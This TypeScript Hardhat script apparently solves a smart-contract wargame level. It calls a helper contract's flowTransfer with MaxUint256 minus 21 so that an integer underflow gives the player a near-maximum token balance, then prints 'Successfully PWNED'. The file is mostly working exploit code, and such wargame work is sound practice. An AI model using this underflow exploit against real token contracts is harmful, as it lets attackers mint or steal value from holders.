import { ethers } from "hardhat"
import { ADDRESSES, LEVEL_ADDRESSES, PLAYER } from "../consts"
import { getSigner } from "../utils"
import { BigNumber } from "ethers"
async function pwn() {
    //contractX
    //determine overflow/underflow amountsX
    //call transfer via tolkein.sol. msg.sender is contract
    //// tx.origin is EOA.  msg.sender balance should be 0\
    //// meaning we only need to underflow by 1 to get maxuint256-1 tokens
    const signer = await getSigner()
    const contract = await ethers.getContractAt(
        "Tolkein",
        ADDRESSES.tolkein,
        signer
    )
    const underflowAmount = ethers.constants.MaxUint256.sub(BigNumber.from(21))
    const call = await contract.flowTransfer(
        PLAYER,
        underflowAmount
    )
    console.log(`
        As the days go by....
    `)
    setTimeout(() => {
        console.log(`
        ...Water flowing under...
    `)
    }, 500)
    console.log(`🌊🌊🌊🌊🌊🌊🌊🌊🌊🌊🌊`)
    
    const receipt = await call.wait()
    if (receipt.status == 0) {
        throw new Error(`Underflow Failed, TX Reverted`)
    }
    console.log(`
       Token @ ${LEVEL_ADDRESSES.token} 
       Successfully PWNED
       😎😎😎😎😎😎😎😎😎😎😎😎😎😎😎😎😎😎😎😎
    `)
    return `😎`
}

pwn()